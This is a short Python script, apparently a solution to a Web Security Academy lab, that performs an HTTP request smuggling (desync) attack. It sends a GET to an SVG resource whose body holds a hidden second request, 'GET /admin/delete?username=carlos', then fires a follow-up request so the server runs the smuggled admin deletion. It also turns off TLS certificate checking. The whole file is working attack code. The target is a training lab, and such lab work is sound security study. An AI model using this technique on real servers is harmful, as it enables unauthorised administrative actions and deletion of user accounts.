import http.client
import ssl

LAB_ID = "???"

host, port = f'{LAB_ID}.web-security-academy.net', 443
connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())


def GET_(
        connection: http.client.HTTPSConnection,
        path: str,
        body: str | None = None
) -> http.client.HTTPResponse:
    method = 'GET'
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    if body:
        headers['content-length'] = str(len(body))

    connection.request(method, path, body, headers)
    return connection.getresponse()


response = GET_(
    connection,
    path="/resources/images/blog.svg",
    body=f"GET /admin/delete?username=carlos HTTP/1.1\r\nxxx: x"
)
print(response.status)
print(response.headers)
print(response.read().decode())
response = GET_(connection, path="/")
print(response.status)
print(response.headers)
print(response.read().decode())
